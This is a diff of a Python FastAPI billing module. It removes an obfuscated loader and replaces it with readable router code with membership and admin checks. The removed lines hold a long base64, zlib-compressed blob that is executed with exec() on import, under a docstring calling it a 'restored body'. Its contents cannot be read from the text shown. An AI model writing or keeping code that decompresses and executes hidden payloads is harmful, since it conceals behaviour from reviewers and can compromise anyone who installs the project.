@@ -1,68 +1,56 @@
-"""Billing API — zlib-restored body (fixes accidental truncation on branch)."""
-from __future__ import annotations
-import base64
-import zlib
-_B64 = (
-    "eNrtW1tv3MYVft9fQfOJBFaUghp9WIBB49pFjcSuENstAkMgZslZiRGXpHlZeaPuf++Z+4XDJbWRYqew"
-    "H+zlzOHMuc05Z85H59u6ajqv7/NssWmqrZehDnf5Fns5mxHPS4/8/VtVYk6H03yLCkH2kj0u2OQGtR2q"
-    "czH5w+Xrn6u+w83S++f795evPqe47vKqXHo/4089brulB/Rd37K3632Gyi5PxesvUIvfVBkult4/clxw"
-    "RttPBSrSG7zdC7oWFzjtOAuoriNgIcpw3QqCv/dNg8vuQ0s4ebl+h9sWuFD0W7JJG63zosjLa/HWv5qM"
-    "0F+i/RZeXnrvUZNvNpcFAv7/g9c3VXX7agczg3Wq5hqV+W+IiKoWU2Nv8HaNG/UasLXLU9xGaYOzvFNs"
-    "08d3bNZBDnvnXYEJd+KVV2po/L2aSSS3ucHpLZhJ2uQNGHu/9K5xl7Rdk9d4sWioGb1YmTSoG7zJP8f+"
-    "OVebD56Crtv4oy8GrsLFYpEWqG2991Xd13yDQNo1XC08+KPrK8mzFThFQyfQturLbiWcDLanfhBcd/HF"
-    "UnhiUhcIpIqfq92ERC+qbD9/N1jn+Pb/9d6CZoAL8g+lSKljpXv6jmO+7VNgrU36pmAkseffdF3drs7P"
-    "iypFxU3VduecymdLojLFxcQbjMgHgVG7L1NQxcZLGlBv3uBkS90ryNYr5etLrwfzU+nIkY8+fHj9cklU"
-    "YQ6F3tn3lHumKrI7ukM5RIN1hD/jFAwf0BkqHD12wdCzw+juBjcaJfkzJIssS3hxzDlaTr3JhSFv8J/q"
-    "lXCh/s43XhO1oDXUJCBVUjVJCf8GoZe3mpxUVpS32AxTAQtOSQreEz+/+AtxuQ7lRey/rToPeUzRXrUx"
-    "fMoP3WZB2TYvT7fKUAv/JzYCLYIIbjMJIxKaJ7WY2idqqgJ7JZDnpRf41V2JGwhtPjWfH564/Q/kbdjU"
-    "o+t5dA/uGBnfvsFd35SEBfCfv7GAG0EMDvxzEplaIFNeVeRtl9Bh06M4f46Y3+SplttefHj90/vXb5PL"
-    "n354+27B92/7onN5E3cilf+E86iRKG8TlHb5DpNfwfumx2EYyrDaEgvT9bmZ2yCMUFFwC4OsQPBRqvbe"
-    "8C0/z/yVV0e2z/kl2mI6Q35Yc0ReCIVV2d0Ue5+G0qCOjNHQekUEc7qkeLBo8jIt+gxnCU/VcmV7wl58"
-    "g8EzQAV0cfFg0bRV36REIj9b+2ruIH9twIFq4pdUp3T4Srgu8VjQo/JPW6lDxSrl3i6HE1y7u4/s15WD"
-    "xKVkoKfDkP0db2g6BkL55Fp8RNXkNT7g3EFT9L1/m5cZ24r+ujo4XlBaX/d50cEhN4kOxhMxwe3S2xEr"
-    "GIcoyju8bblDK8vwUw3GGJxqLsb5vRVjD8ZJJ1UYpwwGpYuWNUiMXZmVrisysMM9rBXYAuSM2QUSkwil"
-    "KSmGZHgwalN4PyRCkcANvMLNIeH0gXMxrhTljb5Fxm1tv6wM468hipTUbISQ7xbxUZ0QXAGYxJlFKYZ1"
-    "UrSDWI3Wxciq3pk38vZBs20N9Zlm3I4UvoZB6Yg06RpK1JVRHs82pQzyadVg+Kvc5DK+09odd+DN1y0L"
-    "7+IJLKhPcoftmr0WOWiCB0LpXpTNyGlLTJOf929U9PhV01TNQzLkhcqQr8sdKmBX2xNkbhYcw7VnlzdV"
-    "Sa8wUFxAuKmyPqWJ3ENlRiOhJIYkU90lW1T2cFNgSk+oBU5M5G/oSh5bidjyrK9JaZLlLfGcjEZnxVCo"
-    "h+dppij/TkGfgaAZ3uGiqsmz/0Tsc4atKCFKVzNIPCA2UOECy8HUyaPexW5bajDDbQqXTyJP7HNdsbMD"
-    "etBi9BZEy1CH4nv/ukFlBxljLZIRZzeE+k1TJpl06JgnBzNETQWa6QDjCg78fmrEBR44xRyPDPpV9uGR"
-    "Yaz8u2SP9LwuSWVWFTu1dUIT+OJPERjm5TPJlCEOFTOTbutWg3lDIgvzPkFMRecPSy8tcrBJwrw41j1a"
-    "TIlqh02KJ+tOxLWmG8hDrYdPUx5xSMzr8Iq0s0BY2tZSUoEg1Jrkr+eBlg4tfcf2oeWSMiUOTq8Uls8P"
-    "62nGc+zXuMxo+0g7fXD5QFkWUJZ1O8P4pujbG561Wub10oKqYwXXC/s8yY2tfpdpYFtqXoaY1YfWLRLy"
-    "CT8waLiKaD8tcOprVE/WblojibmPNmBSqv4R9zP5bNKpsDksiane9TIs42HUcQVgcpNrzRFFsNqflTwQ"
-    "xBMaqMXdiQtuzVqbHdzNA1clOcX7DJ59Zh6TQzamL6TfGMfc/HSxfZkmVsLTWYc5yfptHYzXnnesOd2e"
-    "s7NgZBk2lHCSoGFnYKUa8q58UqN9USE9UlLiiDiYOIr5dUkvXvSmz6ZvMALlt+y6wzY+k3S+IyBbLQjj"
-    "ON9AaVQoxjlLS7XxSNZ5pOiJSaefJT/eyGjQHZOM5CLS2uHjvLue0JTlbXy865J7PcSCXj5/XH3316uD"
-    "z1nOW1KMzGnk6biDs4WnE0DWr3Y5jfpQPXJnWLpJEiVgLIUd66kKjp09O92cvIZiCiZXbFRAVM72kFor"
-    "Er6gaiKlGd8OCMTPg54GFi7hTLFHsxjL80zGWOrAOS1VEIsfJh0b7fY1jrmp1Yi1InPOWHnKYEcmfYK6"
-    "WABtUVndBQJri/ouDd0hT0QMXuzqcANpd9ucsTamCCWRCCRpta0L3DEDSJeFBcEnaG7BGbkNaLXf+lfY"
-    "KrCdn6QQ5v73h5ANASW4qhg06nRYAWYZmUhAA0LgJmEeQzaU9IJJ7kz0LTmpD4pGI1sCBnw/jODCBVWP"
-    "6s6AqrR9ZLu3RjnViFIBPAhd6b8N3YwWKPZJcHSf5NGAOFaRbrAjczoOiIMKTlYLV05YCsRJmCSOhG2q"
-    "caWp4UjO5s4G5MTZxhpkIvcmDLgiFuYuIZJyuBicOi1exu4YKq0sIu0gPonaVp4EbmKdIdNcRt6xl5G2"
-    "JLtyGFhdefRFQ9POR+48s1gdghxfm2sx4YmDbaAaci75MJ8hfspvTbZW6JSoqFwqE37BXocaqkOFT7E9"
-    "cqCHinQa3WQg4GBvQIvH9a8fzcWvwtA7F4Bw4H93ceGHYfSpJ98t/Ibly/5FdPGd73YOWXdMsTIqriw7"
-    "rRBk60uKoPrsYdTXtREImUHlpkICVjfzktci1rbgdHKERNsP7176w31owFXiaTaiTS+0bgN9/sxgLPS+"
-    "9yzdfr1HhDvMNm+3qEtvfv8REaqTWiYKM0eexZZtvl71CA4fUUHSe3WfGbQixPyw9QJ3seo4jq6V4Px7"
-    "IFF988dIZAWGkGe89yRmRT0T66VFaNV3wtaEm9GvFtyRje0oqyZWxzyuCzhK98dKJ3LpkZrlhCpkVBdZ"
-    "X59o6QFfwrjOa9YktVH4xLwnMJiyrjIjLgNCHf3MhYVYdkq+9y5WVk/TvGVZDA8nJi9cdj0YywPhJJu4"
-    "nx2pGON5WrP6cXav0mifiX6c+wMAu3mp3ROcdHBPSqCmrauyxaPXQdOcwyfq9lpu9i/80NWLNEpu0eQy"
-    "KUl44Z+5DVhwVkez4IRjAMLQinOa7nqfndqY/bYqqjEFjfXWBi9Pl2Sz9A9aZTSDs6Ui7yQoNgznVi96"
-    "Oc6ce0pH0Db8bK3uHcflMOK9R3rEJ/SKH5YkXN3asday1SB2nyJ374TwrDmHM0sOm8wqK7qy4XEBfdWb"
-    "gfkjnSRH2rNGhh1g9mWJ9mHw1OclOumX/L6EgvmOz5fJSeGf0q5l0CBplDSH2RdnCUxJR3d/cCI+rNYX"
-    "kF97jH1e82jfquj80c+SlEvDlIIQlVuRYfZwoJ8+gOy4aLFV9vgDETgv5jdoRwDo831V3aK2RceQ6EQQ"
-    "fXlI2r2S4E8s9UtV/UieeQFzyQPe0kb+CDTwy4/wwD95Z8/05zfw+xv4/fjgN7/dGUP0XPs/f3jhPyk0"
-    "PnImjuHk9Gg8PTrOT9wUPm5e3b/B438ueNy03teBjjtznxj8Agh5WlH47exmi1KBZDnIPp8JHgdg+smp"
-    "cTGJxY/Hj68OmLcB+P1t8rVg8NLl5qDwVEr+HP7xULyx/RPh8UofE4i8wcyfEJYnXVu+7Q43+SaHTXY5"
-    "Ssh/lh1A1s+MLjGZ115X3q2sO9rbdfZ1J9v6o15gkZmAs5SrYvjgWGtsiEAb0lvEtrYUuT1j/2+eiZ7x"
-    "YaF9lMCXFElf+yBhANfS/yU2xLWVMQZttHmoMlE0WfijWvQq1PpdE9Cyi88RSPmLe8txDHmm5UyslBtQ"
-    "Q35sMFR8uWJAlRZOORsLnYWDkpreXP/pMNAvbtPjoOdMm/4+oPOL62AK2ZyphXE08ziSOY1iPhGCqZz7"
-    "gcjlcaTuZHtOIZWnRqwjMOVM044LPAVLzoAknXDkSIU1A4wc1Bvh6P+xPxl+dEGPo7DjJOQ4A26cLD2P"
-    "AY3HNDITYpwBL86BFmfBii6s+CiUNQ9GHIMQnfDho0GHjw0bngQZTsOFR/U7DhM+ECKcCQ+OQIMmLCjO"
-    "wep+4N4uWHACEnwgHDgzEj8ECzwsjyDpfzz+NyLVfBBw7m3ppJvSfIjxf45oQDA="
-)
-_SRC = zlib.decompress(base64.b64decode(_B64)).decode("utf-8")
-_g = globals()
-_g["__file__"] = __file__
-_g["__name__"] = __name__
-exec(compile(_SRC, __file__, "exec"), _g)
+import uuid
+from datetime import datetime, timezone
+from decimal import Decimal
+
+from fastapi import APIRouter, HTTPException, Request, status
+from pydantic import BaseModel, Field
+from sqlalchemy import select
+
+from app.api.deps import CurrentUser, DbSession
+from app.models.billing import Order, Payment, TariffPlan, WebhookEvent
+from app.models.organization import OrganizationMember
+from app.services.credits import CreditService
+from app.services.entitlement import EntitlementService
+from app.services.payment import CheckoutRequest, Money, get_stripe
+
+router = APIRouter(prefix="/billing", tags=["billing"])
+
+
+class TopupRequest(BaseModel):
+    organization_id: str
+    amount: Decimal = Field(gt=0, decimal_places=4)
+
+
+class CheckoutBody(BaseModel):
+    organization_id: str
+    plan_id: str
+    amount: Decimal | None = None
+    currency: str | None = None
+    success_url: str = "https://localhost/success"
+    cancel_url: str = "https://localhost/cancel"
+
+
+async def _require_member(db: DbSession, user_id: uuid.UUID, org_id: uuid.UUID) -> None:
+    r = await db.execute(
+        select(OrganizationMember).where(
+            OrganizationMember.organization_id == org_id,
+            OrganizationMember.user_id == user_id,
+        )
+    )
+    if r.scalar_one_or_none() is None:
+        raise HTTPException(status_code=403, detail="Not a member of organization")
+
+
+async def _require_admin(db: DbSession, user_id: uuid.UUID, org_id: uuid.UUID) -> OrganizationMember:
+    r = await db.execute(
+        select(OrganizationMember).where(
+            OrganizationMember.organization_id == org_id,
+            OrganizationMember.user_id == user_id,
+        )
+    )
+    mem = r.scalar_one_or_none()
+    if mem is None:
+        raise HTTPException(status_code=403, detail="Not a member of organization")
+    if mem.role not in ("owner", "admin"):
+        raise HTTPException(status_code=403, detail="Admin or owner role required")
+    return mem
